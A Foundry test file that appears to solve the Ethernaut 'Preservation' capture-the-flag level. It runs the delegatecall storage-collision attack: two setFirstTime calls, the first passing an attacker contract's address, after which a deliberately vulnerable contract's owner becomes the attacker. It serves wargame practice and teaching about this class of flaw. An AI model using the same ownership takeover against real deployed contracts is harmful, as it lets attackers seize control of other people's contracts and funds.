// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {DeployPreservationScript} from "@script/16_DeployPreservation.s.sol";

import {Preservation} from "@main/16_Preservation.sol";
import {PreservationAttacker} from "@main/16_PreservationAttacker.sol";

contract PreservationTest is Test, DeployPreservationScript {
    string mnemonic = "test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    PreservationAttacker preservationAttacker;

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);

        DeployPreservationScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq(preservationChallenge.owner(), deployer);

        preservationAttacker = new PreservationAttacker();
        preservationChallenge.setFirstTime(uint256(uint160(address(preservationAttacker))));
        preservationChallenge.setFirstTime(uint256(uint160(attacker)));

        assertEq(preservationChallenge.owner(), attacker);

        vm.stopPrank();
    }
}
